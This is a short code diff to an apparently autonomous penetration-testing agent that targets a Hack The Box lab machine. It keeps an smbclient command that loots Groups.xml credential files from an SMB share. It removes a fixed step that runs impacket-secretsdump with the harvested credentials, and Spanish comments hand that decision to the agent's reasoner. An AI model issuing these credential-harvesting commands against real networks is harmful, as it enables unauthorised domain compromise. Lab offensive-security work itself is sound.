@@ -329,9 +329,9 @@ class EnterpriseDynamicAgent:
         domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
         if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
             return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
-        creds=self.parse_loot_for_credentials()
-        if creds["username"] and creds["password"] and not any("secretsdump" in c for c in commands):
-            return f"impacket-secretsdump {domain}/{creds['username']}:{creds['password']}@{self.target_ip}","post-exploitation","post.secretsdump"
+        # Las nuevas credenciales/capacidades ya no disparan una receta fija.
+        # Se entregan al modelo del mundo y al razonador para que determine qué
+        # hipótesis merece ser investigada a continuación.
         planner_state={**state,"potential_exploit":potential}
         fallback=self.autonomous_fallback(planner_state,potential_exploit=potential)
         if fallback:return fallback
